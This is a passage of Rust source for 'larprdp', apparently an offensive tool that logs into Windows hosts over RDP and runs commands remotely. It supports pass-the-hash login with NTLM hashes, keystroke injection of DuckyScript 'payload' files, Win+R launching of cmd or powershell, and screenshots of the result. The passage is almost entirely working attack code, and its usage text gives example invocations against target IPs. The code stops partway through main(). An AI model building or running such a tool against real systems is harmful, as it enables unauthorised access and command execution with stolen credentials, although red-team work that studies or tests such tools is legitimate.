// SPDX-License-Identifier: AGPL-3.0

use std::ffi::{CStr, CString};
use std::os::raw::c_char;
use std::process;
use std::time::Duration;

#[repr(C)]
struct RdpBridge {
    _opaque: [u8; 0],
}

extern "C" {
    fn rdp_bridge_create() -> *mut RdpBridge;
    fn rdp_bridge_set_server(bridge: *mut RdpBridge, server: *const c_char) -> i32;
    fn rdp_bridge_set_credentials(
        bridge: *mut RdpBridge,
        username: *const c_char,
        password: *const c_char,
        domain: *const c_char,
    ) -> i32;
    fn rdp_bridge_enable_pth(bridge: *mut RdpBridge) -> i32;
    fn rdp_bridge_connect(bridge: *mut RdpBridge) -> i32;
    fn rdp_bridge_is_active(bridge: *mut RdpBridge) -> i32;
    fn rdp_bridge_send_key(bridge: *mut RdpBridge, down: i32, scancode: u8, extended: i32) -> i32;
    fn rdp_bridge_send_win_r(bridge: *mut RdpBridge) -> i32;
    fn rdp_bridge_take_screenshot(bridge: *mut RdpBridge, path: *const c_char) -> i32;
    fn rdp_bridge_pump_events(bridge: *mut RdpBridge, timeout_ms: i32) -> i32;
    fn rdp_bridge_disconnect(bridge: *mut RdpBridge) -> i32;
    fn rdp_bridge_free(bridge: *mut RdpBridge);
    fn rdp_bridge_last_error(bridge: *mut RdpBridge) -> *const c_char;
}

// ── Scancode constants (from FreeRDP scancode.h) ─────────────────────────

#[allow(dead_code)]
mod sc {
    pub const LSHIFT: u8 = 0x2A;
    pub const RSHIFT: u8 = 0x36;
    pub const LCTRL: u8 = 0x1D;
    pub const RCTRL: u8 = 0x1D; // extended
    pub const LALT: u8 = 0x38;
    pub const RALT: u8 = 0x38; // extended
    pub const LWIN: u8 = 0x5B; // extended
    pub const RWIN: u8 = 0x5C; // extended

    pub const ENTER: u8 = 0x1C;
    pub const BACKSPACE: u8 = 0x0E;
    pub const TAB: u8 = 0x0F;
    pub const SPACE: u8 = 0x39;
    pub const ESCAPE: u8 = 0x01;
    pub const DELETE: u8 = 0x53; // extended
    pub const INSERT: u8 = 0x52; // extended
    pub const HOME: u8 = 0x47;   // extended
    pub const END: u8 = 0x4F;    // extended
    pub const PAGEUP: u8 = 0x49; // extended
    pub const PAGEDOWN: u8 = 0x51; // extended

    pub const UP: u8 = 0x48;    // extended
    pub const DOWN: u8 = 0x50;  // extended
    pub const LEFT: u8 = 0x4B;  // extended
    pub const RIGHT: u8 = 0x4D; // extended

    pub const PRINTSCREEN: u8 = 0x37; // extended
    pub const SCROLLLOCK: u8 = 0x46;
    pub const CAPSLOCK: u8 = 0x3A;
    pub const NUMLOCK: u8 = 0x45;
    pub const PAUSE: u8 = 0x46; // extended
    pub const APPS: u8 = 0x5D;  // extended (context menu)

    pub const F1: u8 = 0x3B;
    pub const F2: u8 = 0x3C;
    pub const F3: u8 = 0x3D;
    pub const F4: u8 = 0x3E;
    pub const F5: u8 = 0x3F;
    pub const F6: u8 = 0x40;
    pub const F7: u8 = 0x41;
    pub const F8: u8 = 0x42;
    pub const F9: u8 = 0x43;
    pub const F10: u8 = 0x44;
    pub const F11: u8 = 0x57;
    pub const F12: u8 = 0x58;

    // Semi-colon on US: VK_OEM_1
    pub const OEM_1: u8 = 0x27;      // ;
    pub const OEM_2: u8 = 0x35;      // /
    pub const OEM_3: u8 = 0x29;      // `
    pub const OEM_4: u8 = 0x1A;      // [
    pub const OEM_5: u8 = 0x2B;      // \ (backslash)
    pub const OEM_6: u8 = 0x1B;      // ]
    pub const OEM_7: u8 = 0x28;      // '
    pub const OEM_COMMA: u8 = 0x33;  // ,
    pub const OEM_PERIOD: u8 = 0x34; // .
    pub const OEM_MINUS: u8 = 0x0C;  // -
    pub const OEM_PLUS: u8 = 0x0D;   // =

    pub const KEY_0: u8 = 0x0B;
    pub const KEY_1: u8 = 0x02;
    pub const KEY_2: u8 = 0x03;
    pub const KEY_3: u8 = 0x04;
    pub const KEY_4: u8 = 0x05;
    pub const KEY_5: u8 = 0x06;
    pub const KEY_6: u8 = 0x07;
    pub const KEY_7: u8 = 0x08;
    pub const KEY_8: u8 = 0x09;
    pub const KEY_9: u8 = 0x0A;

    pub const KEY_A: u8 = 0x1E;
    pub const KEY_B: u8 = 0x30;
    pub const KEY_C: u8 = 0x2E;
    pub const KEY_D: u8 = 0x20;
    pub const KEY_E: u8 = 0x12;
    pub const KEY_F: u8 = 0x21;
    pub const KEY_G: u8 = 0x22;
    pub const KEY_H: u8 = 0x23;
    pub const KEY_I: u8 = 0x17;
    pub const KEY_J: u8 = 0x24;
    pub const KEY_K: u8 = 0x25;
    pub const KEY_L: u8 = 0x26;
    pub const KEY_M: u8 = 0x32;
    pub const KEY_N: u8 = 0x31;
    pub const KEY_O: u8 = 0x18;
    pub const KEY_P: u8 = 0x19;
    pub const KEY_Q: u8 = 0x10;
    pub const KEY_R: u8 = 0x13;
    pub const KEY_S: u8 = 0x1F;
    pub const KEY_T: u8 = 0x14;
    pub const KEY_U: u8 = 0x16;
    pub const KEY_V: u8 = 0x2F;
    pub const KEY_W: u8 = 0x11;
    pub const KEY_X: u8 = 0x2D;
    pub const KEY_Y: u8 = 0x15;
    pub const KEY_Z: u8 = 0x2C;
}

// ── Scancode mapping (US keyboard) ───────────────────────────────────────

/// A character-to-scancode entry.
struct KeyMap {
    scancode: u8,
    extended: bool,
    shift: bool, // true if SHIFT must be held
}

/// Lookup the scancode + shift state for a single ASCII character.
fn char_to_keymap(c: char) -> Option<KeyMap> {
    use sc::*;
    Some(match c {
        'a' | 'A' => KeyMap { scancode: 0x1E, extended: false, shift: c.is_uppercase() },
        'b' | 'B' => KeyMap { scancode: 0x30, extended: false, shift: c.is_uppercase() },
        'c' | 'C' => KeyMap { scancode: 0x2E, extended: false, shift: c.is_uppercase() },
        'd' | 'D' => KeyMap { scancode: 0x20, extended: false, shift: c.is_uppercase() },
        'e' | 'E' => KeyMap { scancode: 0x12, extended: false, shift: c.is_uppercase() },
        'f' | 'F' => KeyMap { scancode: 0x21, extended: false, shift: c.is_uppercase() },
        'g' | 'G' => KeyMap { scancode: 0x22, extended: false, shift: c.is_uppercase() },
        'h' | 'H' => KeyMap { scancode: 0x23, extended: false, shift: c.is_uppercase() },
        'i' | 'I' => KeyMap { scancode: 0x17, extended: false, shift: c.is_uppercase() },
        'j' | 'J' => KeyMap { scancode: 0x24, extended: false, shift: c.is_uppercase() },
        'k' | 'K' => KeyMap { scancode: 0x25, extended: false, shift: c.is_uppercase() },
        'l' | 'L' => KeyMap { scancode: 0x26, extended: false, shift: c.is_uppercase() },
        'm' | 'M' => KeyMap { scancode: 0x32, extended: false, shift: c.is_uppercase() },
        'n' | 'N' => KeyMap { scancode: 0x31, extended: false, shift: c.is_uppercase() },
        'o' | 'O' => KeyMap { scancode: 0x18, extended: false, shift: c.is_uppercase() },
        'p' | 'P' => KeyMap { scancode: 0x19, extended: false, shift: c.is_uppercase() },
        'q' | 'Q' => KeyMap { scancode: 0x10, extended: false, shift: c.is_uppercase() },
        'r' | 'R' => KeyMap { scancode: 0x13, extended: false, shift: c.is_uppercase() },
        's' | 'S' => KeyMap { scancode: 0x1F, extended: false, shift: c.is_uppercase() },
        't' | 'T' => KeyMap { scancode: 0x14, extended: false, shift: c.is_uppercase() },
        'u' | 'U' => KeyMap { scancode: 0x16, extended: false, shift: c.is_uppercase() },
        'v' | 'V' => KeyMap { scancode: 0x2F, extended: false, shift: c.is_uppercase() },
        'w' | 'W' => KeyMap { scancode: 0x11, extended: false, shift: c.is_uppercase() },
        'x' | 'X' => KeyMap { scancode: 0x2D, extended: false, shift: c.is_uppercase() },
        'y' | 'Y' => KeyMap { scancode: 0x15, extended: false, shift: c.is_uppercase() },
        'z' | 'Z' => KeyMap { scancode: 0x2C, extended: false, shift: c.is_uppercase() },
        '1' => KeyMap { scancode: KEY_1, extended: false, shift: false },
        '2' => KeyMap { scancode: KEY_2, extended: false, shift: false },
        '3' => KeyMap { scancode: KEY_3, extended: false, shift: false },
        '4' => KeyMap { scancode: KEY_4, extended: false, shift: false },
        '5' => KeyMap { scancode: KEY_5, extended: false, shift: false },
        '6' => KeyMap { scancode: KEY_6, extended: false, shift: false },
        '7' => KeyMap { scancode: KEY_7, extended: false, shift: false },
        '8' => KeyMap { scancode: KEY_8, extended: false, shift: false },
        '9' => KeyMap { scancode: KEY_9, extended: false, shift: false },
        '0' => KeyMap { scancode: KEY_0, extended: false, shift: false },
        // Shifted number row symbols (!@#$%^&*())
        '!' => KeyMap { scancode: KEY_1, extended: false, shift: true },
        '@' => KeyMap { scancode: KEY_2, extended: false, shift: true },
        '#' => KeyMap { scancode: KEY_3, extended: false, shift: true },
        '$' => KeyMap { scancode: KEY_4, extended: false, shift: true },
        '%' => KeyMap { scancode: KEY_5, extended: false, shift: true },
        '^' => KeyMap { scancode: KEY_6, extended: false, shift: true },
        '&' => KeyMap { scancode: KEY_7, extended: false, shift: true },
        '*' => KeyMap { scancode: KEY_8, extended: false, shift: true },
        '(' => KeyMap { scancode: KEY_9, extended: false, shift: true },
        ')' => KeyMap { scancode: KEY_0, extended: false, shift: true },
        // Symbols on US keyboard
        ' ' => KeyMap { scancode: SPACE, extended: false, shift: false },
        '-' => KeyMap { scancode: OEM_MINUS, extended: false, shift: false },
        '_' => KeyMap { scancode: OEM_MINUS, extended: false, shift: true },
        '=' => KeyMap { scancode: OEM_PLUS, extended: false, shift: false },
        '+' => KeyMap { scancode: OEM_PLUS, extended: false, shift: true },
        '[' => KeyMap { scancode: OEM_4, extended: false, shift: false },
        '{' => KeyMap { scancode: OEM_4, extended: false, shift: true },
        ']' => KeyMap { scancode: OEM_6, extended: false, shift: false },
        '}' => KeyMap { scancode: OEM_6, extended: false, shift: true },
        '\\' => KeyMap { scancode: OEM_5, extended: false, shift: false },
        '|' => KeyMap { scancode: OEM_5, extended: false, shift: true },
        ';' => KeyMap { scancode: OEM_1, extended: false, shift: false },
        ':' => KeyMap { scancode: OEM_1, extended: false, shift: true },
        '\'' => KeyMap { scancode: OEM_7, extended: false, shift: false },
        '"' => KeyMap { scancode: OEM_7, extended: false, shift: true },
        ',' => KeyMap { scancode: OEM_COMMA, extended: false, shift: false },
        '<' => KeyMap { scancode: OEM_COMMA, extended: false, shift: true },
        '.' => KeyMap { scancode: OEM_PERIOD, extended: false, shift: false },
        '>' => KeyMap { scancode: OEM_PERIOD, extended: false, shift: true },
        '/' => KeyMap { scancode: OEM_2, extended: false, shift: false },
        '?' => KeyMap { scancode: OEM_2, extended: false, shift: true },
        '`' => KeyMap { scancode: OEM_3, extended: false, shift: false },
        '~' => KeyMap { scancode: OEM_3, extended: false, shift: true },
        '\t' => KeyMap { scancode: TAB, extended: false, shift: false },
        '\n' => KeyMap { scancode: ENTER, extended: false, shift: false },
        _ => return None,
    })
}

// ── DuckyScript types ────────────────────────────────────────────────────

/// A parsed DuckyScript command.
enum DuckyCmd {
    Comment,
    Delay(u64),                     // milliseconds
    String(String),                 // type text
    StringLn(String),               // type text + Enter
    KeyCombo { mods: Vec<String>, key: String },  // GUI r, CTRL SHIFT ESC, etc.
    KeyPress(String),               // single key: ENTER, TAB, ESC, etc.
    RemBlockStart,
    RemBlockEnd,
    Unknown(String),                // unrecognised (just warn, don't fail)
}

/// Parse a single DuckyScript line into a command.
fn parse_ducky_line(line: &str) -> DuckyCmd {
    let trimmed = line.trim();
    if trimmed.is_empty() {
        return DuckyCmd::Comment;
    }

    // Comments
    if trimmed.starts_with("REM ") || trimmed == "REM" || trimmed.starts_with("rem ") || trimmed == "rem" {
        return DuckyCmd::Comment;
    }
    if trimmed == "REM_BLOCK" || trimmed == "rem_block" {
        return DuckyCmd::RemBlockStart;
    }
    if trimmed == "END_REM" || trimmed == "end_rem" {
        return DuckyCmd::RemBlockEnd;
    }

    // DELAY <ms>
    if let Some(rest) = trimmed.strip_prefix("DELAY ").or_else(|| trimmed.strip_prefix("delay ")) {
        if let Ok(ms) = rest.trim().parse::<u64>() {
            return DuckyCmd::Delay(ms);
        }
        // Could be a variable reference; ignore for now
        return DuckyCmd::Unknown(trimmed.to_string());
    }

    // DEFAULTDELAY or DEFAULT_DELAY - set default delay (we just ignore and let user use DELAY)
    if trimmed.starts_with("DEFAULT") || trimmed.starts_with("default") {
        return DuckyCmd::Unknown(trimmed.to_string());
    }

    // STRINGLN <text>
    if let Some(rest) = trimmed.strip_prefix("STRINGLN ").or_else(|| trimmed.strip_prefix("stringln ")) {
        return DuckyCmd::StringLn(rest.to_string());
    }
    if trimmed == "STRINGLN" || trimmed == "stringln" {
        return DuckyCmd::StringLn(String::new());
    }

    // STRING <text>
    if let Some(rest) = trimmed.strip_prefix("STRING ").or_else(|| trimmed.strip_prefix("string ")) {
        return DuckyCmd::String(rest.to_string());
    }
    if trimmed == "STRING" || trimmed == "string" {
        return DuckyCmd::String(String::new());
    }

    // Single key press commands (must be checked before combo parsing)
    let single_keys = [
        "ENTER", "enter",
        "ESC", "esc", "ESCAPE", "escape",
        "TAB", "tab",
        "BACKSPACE", "backspace",
        "SPACE", "space",
        "DELETE", "delete", "DEL", "del",
        "INSERT", "insert",
        "HOME", "home",
        "END", "end",
        "PAGEUP", "pageup", "PAGE_UP", "page_up",
        "PAGEDOWN", "pagedown", "PAGE_DOWN", "page_down",
        "UP", "up", "UPARROW", "uparrow",
        "DOWN", "down", "DOWNARROW", "downarrow",
        "LEFT", "left", "LEFTARROW", "leftarrow",
        "RIGHT", "right", "RIGHTARROW", "rightarrow",
        "CAPSLOCK", "capslock",
        "NUMLOCK", "numlock",
        "SCROLLLOCK", "scrolllock",
        "PRINTSCREEN", "printscreen",
        "MENU", "menu", "APP", "app",
        "PAUSE", "pause", "BREAK", "break",
    ];
    if single_keys.contains(&trimmed) {
        return DuckyCmd::KeyPress(trimmed.to_uppercase());
    }

    // F1-F12
    if trimmed.len() >= 2 && (trimmed.starts_with('F') || trimmed.starts_with('f')) {
        let num: u8 = trimmed[1..].parse().unwrap_or(0);
        if (1..=12).contains(&num) {
            return DuckyCmd::KeyPress(format!("F{}", num));
        }
    }

    // Modifier combos: e.g., "GUI r", "CTRL c", "CTRL SHIFT ESC", "CONTROL ALT DELETE"
    // Split by whitespace and check if it's a combo
    let parts: Vec<&str> = trimmed.split_whitespace().collect();
    if parts.len() >= 2 {
        // Known modifiers
        let mod_keywords = [
            "GUI", "gui", "WINDOWS", "windows",
            "CTRL", "ctrl", "CONTROL", "control",
            "ALT", "alt",
            "SHIFT", "shift",
            "COMMAND", "command",
        ];

        // Check if the last part is NOT a modifier (it's the key to press)
        let last = *parts.last().unwrap();
        if !mod_keywords.contains(&last) {
            // Everything except last is modifiers
            let mods: Vec<String> = parts[..parts.len()-1].iter()
                .map(|s| s.to_uppercase())
                .collect();
            let key = last.to_uppercase();
            return DuckyCmd::KeyCombo { mods, key };
        }
    }

    DuckyCmd::Unknown(trimmed.to_string())
}

// ── Bridge wrapper ───────────────────────────────────────────────────────

struct Bridge {
    ptr: *mut RdpBridge,
}

impl Bridge {
    fn new() -> Result<Self, String> {
        let ptr = unsafe { rdp_bridge_create() };
        if ptr.is_null() {
            return Err("Failed to create RDP bridge".to_string());
        }
        Ok(Self { ptr })
    }

    fn set_server(&self, server: &str) -> Result<(), String> {
        let c_server = CString::new(server).map_err(|e| format!("Invalid server: {e}"))?;
        let ret = unsafe { rdp_bridge_set_server(self.ptr, c_server.as_ptr()) };
        if ret != 0 { Err(self.last_error()) } else { Ok(()) }
    }

    fn set_credentials(&self, username: &str, password: &str, domain: &str) -> Result<(), String> {
        let c_user = CString::new(username).map_err(|e| format!("Invalid username: {e}"))?;
        let c_pass = CString::new(password).map_err(|e| format!("Invalid password: {e}"))?;
        let c_dom = CString::new(domain).map_err(|e| format!("Invalid domain: {e}"))?;
        let ret = unsafe {
            rdp_bridge_set_credentials(self.ptr, c_user.as_ptr(), c_pass.as_ptr(), c_dom.as_ptr())
        };
        if ret != 0 { Err(self.last_error()) } else { Ok(()) }
    }

    fn connect(&self) -> Result<(), String> {
        let ret = unsafe { rdp_bridge_connect(self.ptr) };
        if ret != 0 { Err(self.last_error()) } else { Ok(()) }
    }

    fn is_active(&self) -> bool {
        unsafe { rdp_bridge_is_active(self.ptr) != 0 }
    }

    /// Pump the FreeRDP event loop so pending keyboard inputs are actually sent.
    /// A tiny timeout (1ms) returns immediately to avoid blocking typing.
    fn pump(&self) -> Result<(), String> {
        let ret = unsafe { rdp_bridge_pump_events(self.ptr, 1) };
        if ret != 0 { Err(self.last_error()) } else { Ok(()) }
    }

    /// Send a single key event (press or release).
    fn send_key_raw(&self, down: bool, scancode: u8, extended: bool) -> Result<(), String> {
        let ret = unsafe {
            rdp_bridge_send_key(self.ptr, if down { 1 } else { 0 }, scancode, if extended { 1 } else { 0 })
        };
        if ret != 0 { Err(self.last_error()) } else { Ok(()) }
    }

    /// Press and release a single key.
    fn press_key(&self, scancode: u8, extended: bool) -> Result<(), String> {
        self.send_key_raw(true, scancode, extended)?;
        std::thread::sleep(Duration::from_millis(20));
        self.send_key_raw(false, scancode, extended)?;
        std::thread::sleep(Duration::from_millis(20));
        Ok(())
    }

    /// Send a modifier combo: hold all modifiers, press key, release all.
    fn send_combo(&self, mods: &[(u8, bool)], key: (u8, bool)) -> Result<(), String> {
        // Hold modifiers
        for &(sc, ext) in mods {
            self.send_key_raw(true, sc, ext)?;
            std::thread::sleep(Duration::from_millis(10));
        }
        // Press and release the key
        self.send_key_raw(true, key.0, key.1)?;
        std::thread::sleep(Duration::from_millis(30));
        self.send_key_raw(false, key.0, key.1)?;
        std::thread::sleep(Duration::from_millis(10));
        // Release modifiers (reverse order)
        for &(sc, ext) in mods.iter().rev() {
            self.send_key_raw(false, sc, ext)?;
            std::thread::sleep(Duration::from_millis(10));
        }
        std::thread::sleep(Duration::from_millis(30));
        Ok(())
    }

    /// Type a single character.
    fn type_char(&self, c: char) -> Result<(), String> {
        if let Some(km) = char_to_keymap(c) {
            if km.shift {
                self.send_key_raw(true, sc::LSHIFT, false)?;
                std::thread::sleep(Duration::from_millis(10));
            }
            self.send_key_raw(true, km.scancode, km.extended)?;
            std::thread::sleep(Duration::from_millis(15));
            self.send_key_raw(false, km.scancode, km.extended)?;
            std::thread::sleep(Duration::from_millis(10));
            if km.shift {
                self.send_key_raw(false, sc::LSHIFT, false)?;
                std::thread::sleep(Duration::from_millis(10));
            }
        }
        Ok(())
    }

    /// Type a full string character by character, pumping events every 10 chars
    /// so the FreeRDP input buffer doesn't fill up and reject further keystrokes.
    fn type_string(&self, s: &str) -> Result<(), String> {
        for (i, c) in s.chars().enumerate() {
            self.type_char(c)?;
            // Pump every 10 characters to keep the FreeRDP event loop healthy
            if i > 0 && i % 10 == 0 {
                self.pump()?;
            }
        }
        Ok(())
    }

    /// Type a string followed by Enter.
    fn type_string_ln(&self, s: &str) -> Result<(), String> {
        self.type_string(s)?;
        self.press_key(sc::ENTER, false)?;
        Ok(())
    }

    /// Convert a modifier key name to scancode(s).
    fn mod_name_to_scancode(name: &str) -> Option<(u8, bool)> {
        Some(match name {
            "GUI" | "WINDOWS" | "COMMAND" | "META" | "WIN" => (sc::LWIN, true),
            "CTRL" | "CONTROL" => (sc::LCTRL, false),
            "ALT" => (sc::LALT, false),
            "SHIFT" => (sc::LSHIFT, false),
            _ => return None,
        })
    }

    /// Convert a key name to scancode.
    fn key_name_to_scancode(name: &str) -> Option<(u8, bool)> {
        Some(match name {
            "ENTER" => (sc::ENTER, false),
            "ESC" | "ESCAPE" => (sc::ESCAPE, false),
            "TAB" => (sc::TAB, false),
            "BACKSPACE" => (sc::BACKSPACE, false),
            "SPACE" => (sc::SPACE, false),
            "DELETE" | "DEL" => (sc::DELETE, true),
            "INSERT" => (sc::INSERT, true),
            "HOME" => (sc::HOME, true),
            "END" => (sc::END, true),
            "PAGEUP" | "PAGE_UP" => (sc::PAGEUP, true),
            "PAGEDOWN" | "PAGE_DOWN" => (sc::PAGEDOWN, true),
            "UP" | "UPARROW" => (sc::UP, true),
            "DOWN" | "DOWNARROW" => (sc::DOWN, true),
            "LEFT" | "LEFTARROW" => (sc::LEFT, true),
            "RIGHT" | "RIGHTARROW" => (sc::RIGHT, true),
            "CAPSLOCK" => (sc::CAPSLOCK, false),
            "NUMLOCK" => (sc::NUMLOCK, false),
            "SCROLLLOCK" => (sc::SCROLLLOCK, false),
            "PRINTSCREEN" => (sc::PRINTSCREEN, true),
            "MENU" | "APP" => (sc::APPS, true),
            "PAUSE" | "BREAK" => (sc::PAUSE, true),
            "F1" => (sc::F1, false),
            "F2" => (sc::F2, false),
            "F3" => (sc::F3, false),
            "F4" => (sc::F4, false),
            "F5" => (sc::F5, false),
            "F6" => (sc::F6, false),
            "F7" => (sc::F7, false),
            "F8" => (sc::F8, false),
            "F9" => (sc::F9, false),
            "F10" => (sc::F10, false),
            "F11" => (sc::F11, false),
            "F12" => (sc::F12, false),
            _ => return None,
        })
    }

    /// Execute a single DuckyScript command.
    fn exec_ducky_cmd(&self, cmd: &DuckyCmd) -> Result<(), String> {
        match cmd {
            DuckyCmd::Comment | DuckyCmd::RemBlockStart | DuckyCmd::RemBlockEnd => {}

            DuckyCmd::Delay(ms) => {
                // Pump events continuously during the delay so that any
                // buffered keystrokes (from type_string's periodic pump)
                // actually get sent to the remote side and processed.
                let chunk = 50u64.min(*ms);
                let mut remaining = *ms;
                while remaining > 0 {
                    let wait = remaining.min(50);
                    match self.pump() {
                        Ok(_) => {}
                        Err(e) => {
                            eprintln!("[!] Pump during delay: {e}");
                        }
                    }
                    std::thread::sleep(Duration::from_millis(wait.min(chunk)));
                    remaining = remaining.saturating_sub(wait);
                }
            }

            DuckyCmd::String(s) => {
                self.type_string(s)?;
            }

            DuckyCmd::StringLn(s) => {
                self.type_string_ln(s)?;
            }

            DuckyCmd::KeyPress(name) => {
                if let Some((sc, ext)) = Self::key_name_to_scancode(name) {
                    self.press_key(sc, ext)?;
                }
            }

            DuckyCmd::KeyCombo { mods, key } => {
                let mod_scancodes: Vec<(u8, bool)> = mods.iter()
                    .filter_map(|m| Self::mod_name_to_scancode(m.as_str()))
                    .collect();
                if let Some(key_sc) = Self::key_name_to_scancode(key) {
                    self.send_combo(&mod_scancodes, key_sc)?;
                } else if key.len() == 1 {
                    // Single character: use raw scancode (no auto-shift)
                    let c = key.chars().next().unwrap();
                    let base = c.to_ascii_lowercase();
                    if let Some(km) = char_to_keymap(base) {
                        self.send_combo(&mod_scancodes, (km.scancode, km.extended))?;
                    }
                }
            }

            DuckyCmd::Unknown(line) => {
                eprintln!("[!] Unknown DuckyScript command: {line}");
            }
        }
        Ok(())
    }

    /// Execute a DuckyScript from a file.
    fn exec_ducky_file(&self, path: &str) -> Result<(), String> {
        let content = std::fs::read_to_string(path)
            .map_err(|e| format!("Cannot read DuckyScript file '{path}': {e}"))?;

        let mut in_rem_block = false;

        for (lineno, line) in content.lines().enumerate() {
            let cmd = parse_ducky_line(line);

            match &cmd {
                DuckyCmd::RemBlockStart => { in_rem_block = true; continue; }
                DuckyCmd::RemBlockEnd => { in_rem_block = false; continue; }
                _ => {}
            }

            if in_rem_block {
                continue;
            }

            if matches!(cmd, DuckyCmd::Comment) {
                continue;
            }

            if let Err(e) = self.exec_ducky_cmd(&cmd) {
                eprintln!("[!] Error at line {}: {e}", lineno + 1);
                return Err(e);
            }
        }

        Ok(())
    }

    /// Send Win+R, wait, type string, press Enter.
    fn winr_and_type(&self, text: &str) -> Result<(), String> {
        // Send Win+R
        self.send_combo(&[(sc::LWIN, true)], (sc::KEY_R, false))?;
        // Wait for Run dialog to open
        std::thread::sleep(Duration::from_millis(500));
        // Type the text
        self.type_string(text)?;
        // Wait a moment then press Enter
        std::thread::sleep(Duration::from_millis(500));
        self.press_key(sc::ENTER, false)?;
        Ok(())
    }

    fn disconnect(&self) -> Result<(), String> {
        let ret = unsafe { rdp_bridge_disconnect(self.ptr) };
        if ret != 0 { Err(self.last_error()) } else { Ok(()) }
    }

    fn last_error(&self) -> String {
        unsafe {
            let ptr = rdp_bridge_last_error(self.ptr);
            if ptr.is_null() { "Unknown error".to_string() }
            else { CStr::from_ptr(ptr).to_string_lossy().into_owned() }
        }
    }
}

impl Drop for Bridge {
    fn drop(&mut self) {
        unsafe { rdp_bridge_free(self.ptr) };
    }
}

// ── CLI help ──────────────────────────────────────────────────────────────

fn print_usage() {
    eprintln!("larprdp - RDP command execution tool");
    eprintln!();
    eprintln!("Usage:");
    eprintln!("  larprdp [options] <server> <username> <password> [domain]");
    eprintln!();
    eprintln!("Options:");
    eprintln!("  --pth                       Use NTLM hash for authentication (pass-the-hash).");
    eprintln!("                                The password argument is treated as an NTLM hash.");
    eprintln!("  -w, --wait <seconds>        Wait N seconds after session is established");
    eprintln!("                                before executing actions (default: 10). Helps when");
    eprintln!("                                scripts/commands are sent before the desktop loads.");
    eprintln!("  -d, --duckyscript <file>    Execute a DuckyScript file after connection");
    eprintln!("                                (and optional --wait).");
    eprintln!("  --winr <string>             Send Win+R, wait 0.5s, type string, press Enter.");
    eprintln!("                                Only one of --duckyscript or --winr can be used.");
    eprintln!("                                Without --duckyscript or --winr, connection check only.");
    eprintln!("  --screenshot <file>         Save a BMP screenshot after all actions complete.");
    eprintln!("                                Works with --winr, --duckyscript, or default mode.");
    eprintln!("  --screenshot-delay <secs>    Wait additional N seconds before taking screenshot");
    eprintln!("                                (default: 5). Gives time for app to fully render.");
    eprintln!();
    eprintln!("DuckyScript commands supported:");
    eprintln!("  REM, DELAY <ms>, STRING <text>, STRINGLN <text>,");
    eprintln!("  GUI|CTRL|ALT|SHIFT <key>, ENTER, TAB, ESC, BACKSPACE,");
    eprintln!("  DELETE, INSERT, HOME, END, PAGEUP, PAGEDOWN,");
    eprintln!("  UP, DOWN, LEFT, RIGHT, CAPSLOCK, PRINTSCREEN,");
    eprintln!("  F1-F12, MENU, PAUSE/BREAK, MULTI-MOD combos (CTRL ALT DEL)");
    eprintln!();
    eprintln!("Examples:");
    eprintln!("  larprdp 192.168.1.100 user password   (connection check only)");
    eprintln!("  larprdp -w 20 --winr cmd 192.168.1.100 user password");
    eprintln!("  larprdp -w 10 --duckyscript payload.txt --screenshot out.bmp \\\n   192.168.1.100 user password domain");
    eprintln!("  larprdp --wait 20 --winr powershell.exe --screenshot shot.bmp");
    eprintln!("           --screenshot-delay 5 192.168.1.100 user pass domain");
    eprintln!();
    eprintln!("Pass-the-Hash:");
    eprintln!("  larprdp --pth --winr cmd 192.168.1.100 user");
    eprintln!("           31d6cfe0d16ae931b73c59d7e0c089c0");
    eprintln!("  (NTLM hash format: NT hash (32 hex chars) or LM:NT (65 chars))");
    eprintln!("  larprdp -w 15 -d script.txt 192.168.1.100 user password domain");
    eprintln!("  larprdp target.domain user password domain");
    eprintln!("  # Default (no --winr/--duckyscript): connects, verifies session, disconnects.");
}

// ── Argument parsing (manual, no clap dependency) ────────────────────────

struct Args {
    server: String,
    username: String,
    password: String,
    domain: String,
    pth: bool,
    wait_seconds: u64,
    duckyscript: Option<String>,
    winr: Option<String>,
    screenshot: Option<String>,
    screenshot_delay: u64,
}

fn parse_args() -> Result<Args, String> {
    let raw: Vec<String> = std::env::args().collect();

    if raw.len() < 4 {
        return Err("Not enough arguments".to_string());
    }

    let mut i = 1;
    let mut pth: bool = false;
    let mut wait_seconds: u64 = 10;
    let mut duckyscript: Option<String> = None;
    let mut winr: Option<String> = None;
    let mut screenshot: Option<String> = None;
    let mut screenshot_delay: u64 = 5;

    // Parse flags (before positional args)
    while i < raw.len() && raw[i].starts_with('-') {
        match raw[i].as_str() {
            "--pth" => {
                pth = true;
                i += 1;
            }
            "-w" | "--wait" => {
                i += 1;
                if i >= raw.len() {
                    return Err("--wait requires a value (seconds)".to_string());
                }
                wait_seconds = raw[i].parse::<u64>().map_err(|_| {
                    format!("Invalid --wait value '{}', expected number of seconds", raw[i])
                })?;
                i += 1;
            }
            "-d" | "--duckyscript" => {
                i += 1;
                if i >= raw.len() {
                    return Err("--duckyscript requires a file path".to_string());
                }
                duckyscript = Some(raw[i].clone());
                i += 1;
            }
            "--winr" => {
                i += 1;
                if i >= raw.len() {
                    return Err("--winr requires a string value".to_string());
                }
                winr = Some(raw[i].clone());
                i += 1;
            }
            "--screenshot" => {
                i += 1;
                if i >= raw.len() {
                    return Err("--screenshot requires a file path".to_string());
                }
                screenshot = Some(raw[i].clone());
                i += 1;
            }
            "--screenshot-delay" => {
                i += 1;
                if i >= raw.len() {
                    return Err("--screenshot-delay requires a value (seconds)".to_string());
                }
                screenshot_delay = raw[i].parse::<u64>().map_err(|_| {
                    format!("Invalid --screenshot-delay value '{}', expected seconds", raw[i])
                })?;
                i += 1;
            }
            other => {
                return Err(format!("Unknown option: {other}"));
            }
        }
    }

    // Remaining positional args: server, username, password, [domain]
    let positional: Vec<&str> = raw.iter().skip(i).map(|s| s.as_str()).collect();
    if positional.len() < 3 {
        return Err("Missing required arguments: <server> <username> <password>".to_string());
    }

    let server = positional[0].to_string();
    let username = positional[1].to_string();
    let password = positional[2].to_string();
    let domain = positional.get(3).map(|s| s.to_string()).unwrap_or_else(|| ".".to_string());

    // Validate action flags
    if duckyscript.is_some() && winr.is_some() {
        return Err("--duckyscript and --winr cannot be used together".to_string());
    }

    Ok(Args { server, username, password, domain, pth, wait_seconds, duckyscript, winr, screenshot, screenshot_delay })
}

// ── Main ──────────────────────────────────────────────────────────────────

fn main() {
    let args = match parse_args() {
        Ok(a) => a,
        Err(e) => {
            eprintln!("Error: {e}");
            eprintln!();
            print_usage();
            process::exit(1);
        }
    };

    println!("=== larprdp ===");
    println!("Target  : {}", args.server);
    println!("User    : {}", args.username);
    println!("Domain  : {}", args.domain);
    println!();

    let bridge = match Bridge::new() {
        Ok(b) => b,
        Err(e) => {
